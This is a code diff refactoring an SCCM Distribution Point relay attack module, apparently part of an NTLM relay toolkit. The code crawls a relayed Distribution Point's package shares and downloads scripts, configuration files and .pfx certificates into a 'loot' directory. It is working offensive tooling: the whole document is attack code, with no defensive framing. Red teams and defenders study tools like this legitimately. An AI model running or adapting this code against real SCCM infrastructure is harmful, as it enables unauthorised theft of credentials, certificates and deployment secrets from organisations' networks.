@@ -10,7 +10,7 @@
 #   SCCM relay attack to dump files from Distribution Points
 # 
 # Authors:
-#    Quentin Roland(@croco_byte)
+#    Quentin Roland(@croco_byte - Synacktiv)
 #    Based on SCCMSecrets.py (https://github.com/synacktiv/SCCMSecrets/)
 #    Inspired by the initial pull request of Alberto Rodriguez (@__ar0d__)
 #    Credits to @badsectorlabs for the datalib file indexing method
@@ -50,7 +50,7 @@ class PackageIDsRetriever(HTMLParser):
                     if not last_part.endswith('.INI'):
                         self.package_ids.add(last_part)
 
-class FileAndDirsRetriever(HTMLParser):
+class FilesAndDirsRetriever(HTMLParser):
     def __init__(self):
         super().__init__()
         self.links = []
@@ -69,7 +69,7 @@ class FileAndDirsRetriever(HTMLParser):
 
 
 class SCCMDPAttack:
-    max_recursion_depth = 5
+    max_recursion_depth = 7
     DP_DOWNLOAD_HEADERS = {
             "User-Agent": "SMS CCM 5.0 TS"
     }
@@ -77,8 +77,8 @@ class SCCMDPAttack:
     def _run(self):
         LOG.info("Starting SCCM DP attack")
 
-        distribution_point = f"{'https' if self.client.port == 443 else 'http'}://{self.client.host}"
-        loot_dir = f"{self.client.host}_{datetime.now().strftime('%Y%m%d%H%M%S')}_sccm_dp_loot"
+        self.distribution_point = f"{'https' if self.client.port == 443 else 'http'}://{self.client.host}"
+        self.loot_dir = f"{self.client.host}_{datetime.now().strftime('%Y%m%d%H%M%S')}_sccm_dp_loot"
         if self.config.SCCMDPExtensions == None:
             self.config.SCCMDPExtensions = [".ps1", ".bat", ".xml", ".txt", ".pfx"]
         elif not self.config.SCCMDPExtensions.strip():
@@ -87,92 +87,107 @@ class SCCMDPAttack:
             self.config.SCCMDPExtensions = [x.strip() for x in self.config.SCCMDPExtensions.split(',')]
 
         try:
-            os.makedirs(loot_dir, exist_ok=True)
-            LOG.info(f"Loot directory is: {loot_dir}")
+            os.makedirs(self.loot_dir, exist_ok=True)
+            LOG.info(f"Loot directory is: {self.loot_dir}")
         except Exception as err:
             LOG.error(f"Error creating base output directory: {err}")
             return
 
 
-        # If a set of URLs was provided or an existing index file, do not reindex
-        if self.config.SCCMDPFiles is None and self.config.SCCMDPIndexfile is None:
+        # If a set of URLs was provided, do not reindex
+        if self.config.SCCMDPFiles is None:
             try:
-                LOG.debug("Performing file indexing from Datalib")
-                self.fetchPackageIDsFromDatalib(distribution_point, loot_dir)
-                LOG.info("File indexing from Datalib performed")
+                LOG.debug("Retrieving package IDs from Datalib")
+                self.package_ids = set()
+                self.fetch_package_ids_from_datalib()
             except Exception as e:
                 LOG.error(f"Encountered an error while indexing files from Distribution Point: {e}")
                 return
 
         try:
             LOG.debug("Performing file download")
-            self.downloadTargetFiles(loot_dir, self.config.SCCMDPExtensions, self.config.SCCMDPIndexfile, self.config.SCCMDPFiles)
+            self.download_target_files()
             LOG.info("File download performed")
         except Exception as e:
             LOG.error(f"Encountered an error while downloading target files: {e}")
             return
         
-        LOG.info(f"DONE - attack finished. Check loot directory {loot_dir}")
+        LOG.info(f"DONE - attack finished. Check loot directory {self.loot_dir}")
 
 
 
 
-    def recursiveFileExtract(self, data, extensions):
+    def recursive_file_extract(self, data):
         to_download = []
         if isinstance(data, dict):
             for key, value in data.items():
-                if value is None and key.endswith(tuple(extensions)):
+                if value is None and key.endswith(tuple(self.config.SCCMDPExtensions)):
                     to_download.append(key)
                 else:
-                    to_download.extend(self.recursiveFileExtract(data[key], extensions))
+                    to_download.extend(self.recursive_file_extract(data[key]))
         return to_download
     
-    def downloadFiles(self, loot_dir, package, files):
+
+    def download_files(self, files):
         for file in files:
             try:
                 parsed_url = urllib.parse.urlparse(file)
-                filename = urllib.parse.unquote(parsed_url.path.split('/')[-1])
+                filename = '__'.join(parsed_url.path.split('/')[3:])
+                package = parsed_url.path.split('/')[2]
                 self.client.request("GET", file, headers=self.DP_DOWNLOAD_HEADERS)
                 r = self.client.getresponse().read()
-                output_file = f"{loot_dir}/{filename}"
+                output_file = f"{self.loot_dir}/packages/{package}/{filename}"
                 with open(output_file, 'wb') as f:
                     f.write(r)
                 LOG.info(f"Package {package} - downloaded file {filename}")
             except Exception as e:
-                LOG.error(f"[!] Error when handling package {file}")
+                LOG.error(f"[!] Error when downloading the following file: {file}")
                 LOG.error(f"{e}")
 
 
-    def downloadTargetFiles(self, loot_dir, extensions, index_file, files):
-        if files is not None:
-            with open(files, 'r') as f:
-                to_download = f.read().splitlines()
-                os.makedirs(f'{loot_dir}/files')
-                self.downloadFiles(f'{loot_dir}/files', 'N/A', to_download)
-        else:
-            if index_file is not None:
-                with open(index_file, 'r') as f:
-                    content = json.loads(f.read())
-            else:
-                with open(f'{loot_dir}/index.json', 'r') as f:
-                    content = json.loads(f.read())
-            for key, value in content.items():
-                to_download = self.recursiveFileExtract(value, extensions)
-                if len(to_download) == 0:
+    def download_target_files(self):
+        if self.config.SCCMDPFiles is not None:
+            with open(self.config.SCCMDPFiles, 'r') as f:
+                contents = f.read().splitlines()
+            package_ids = set()
+            to_download = []
+            for file in contents:
+                try:
+                    package_ids.add(urllib.parse.urlparse(file).path.split('/')[2])
+                    if file.strip() is not None: to_download.append(file) 
+                except:
+                    LOG.error(f"(Skipping) URL has wrong format: {file}")
                     continue
-                if not os.path.exists(f'{loot_dir}/{key}'):
-                    os.makedirs(f'{loot_dir}/{key}')
+            for package_id in package_ids:
+                os.makedirs(f'{self.loot_dir}/packages/{package_id}', exist_ok=True)
+            self.download_files(to_download)
+        else:
+            self.handle_packages()
 
-                self.downloadFiles(f'{loot_dir}/{key}', key, to_download)
+
+    def handle_packages(self):
+        with open(f"{self.loot_dir}/index.txt", "a") as f:
+            for i, package_id in enumerate(self.package_ids):
+                package_index = {package_id: {}}
+                self.recursive_package_directory_fetch(package_index[package_id], f"{self.distribution_point}/sms_dp_smspkg$/{package_id}", 0)
+                print_tree(package_index, f)
+                to_download = self.recursive_file_extract(package_index[package_id])
+                if len(to_download) == 0:
+                    LOG.debug(f"Handled package {package_id} ({i+1}/{len(self.package_ids)})")
+                    continue
+                os.makedirs(f'{self.loot_dir}/packages/{package_id}', exist_ok=True)
+                self.download_files(to_download)
+                LOG.debug(f"Handled package {package_id} ({i+1}/{len(self.package_ids)})")
+        LOG.info("[+] Package handling complete")
 
 
-    def recursivePackageDirectoryFetch(self, object, directory, depth):
+    def recursive_package_directory_fetch(self, object, directory, depth):
         depth += 1
 
         self.client.request("GET", directory, headers=self.DP_DOWNLOAD_HEADERS)
         r = self.client.getresponse().read()
 
-        parser = FileAndDirsRetriever()
+        parser = FilesAndDirsRetriever()
         parser.feed(r.decode())
         
         files = []
@@ -180,7 +195,7 @@ class SCCMDPAttack:
             if '<dir>' in href[1]:
                 if depth <= self.max_recursion_depth:
                     object[href[0]] = {}
-                    self.recursivePackageDirectoryFetch(object[href[0]], href[0], depth)
+                    self.recursive_package_directory_fetch(object[href[0]], href[0], depth)
                 else:
                     object[href[0]] = "Maximum recursion depth reached"
             else:
@@ -189,45 +204,12 @@ class SCCMDPAttack:
             object[file] = None
 
 
-    def fetchPackageIDsFromDatalib(self, distribution_point, loot_dir):
-        package_ids = set()
-        self.client.request("GET", f"{distribution_point}/sms_dp_smspkg$/Datalib", headers=self.DP_DOWNLOAD_HEADERS)
+    def fetch_package_ids_from_datalib(self):
+        self.client.request("GET", f"{self.distribution_point}/sms_dp_smspkg$/Datalib", headers=self.DP_DOWNLOAD_HEADERS)
         r = self.client.getresponse().read()
         packageIDs_parser = PackageIDsRetriever()
         packageIDs_parser.feed(r.decode())
-        package_ids = packageIDs_parser.package_ids
-
+        self.package_ids = packageIDs_parser.package_ids
             
-        LOG.info(f"Found {len(package_ids)} packages")
-        LOG.debug(package_ids)
-
-        results = {}
-        for package_id in package_ids:
-            fileDir_parser = FileAndDirsRetriever()
-            self.client.request("GET", f"{distribution_point}/sms_dp_smspkg$/{package_id}", headers=self.DP_DOWNLOAD_HEADERS)
-            r = self.client.getresponse().read()
-            fileDir_parser.feed(r.decode())
-
-            files = []
-            directories = []
-            for href in fileDir_parser.links:
-                if '<dir>' in href[1]:
-                    directories.append(href[0])
-                else:
-                    files.append(href[0])
-
-            results[package_id] = {}
-            for directory in directories:
-                results[package_id][directory] = {}
-            for file in files:
-                results[package_id][file] = None
-        
-        for package in results.keys():
-            for item in results[package].keys():
-                if isinstance(results[package][item], dict):
-                    self.recursivePackageDirectoryFetch(results[package][item], item, 0)
-        
-        with open(f'{loot_dir}/index.json', 'w') as f:
-            f.write(json.dumps(results))
-        with open(f'{loot_dir}/index.txt', 'w') as out:
-            print_tree(results, out)
+        LOG.info(f"Found {len(self.package_ids)} packages")
+        LOG.debug(self.package_ids)
